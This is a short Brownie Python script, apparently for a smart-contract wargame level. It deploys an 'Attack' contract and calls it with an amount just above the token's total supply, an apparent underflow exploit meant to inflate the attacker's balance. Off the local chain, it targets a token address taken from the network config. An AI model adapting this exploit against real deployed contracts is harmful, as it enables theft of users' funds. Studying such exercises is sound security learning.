from brownie import Attack, Token, Contract, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        token = Token.deploy(21000000, {"from": get_account(index=1)})

        attack = Attack.deploy(token, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        token = Contract.from_abi(
            Token._name,
            config["networks"][network.show_active()]["token"],
            Token.abi,
        )

        attack = Attack.deploy(token, {"from": account})

    attack.attack(account, 21000001, {"from": account, "gas_limit": "100000"}).wait(1)

    print(token.balanceOf(attack))


def main():
    attack()
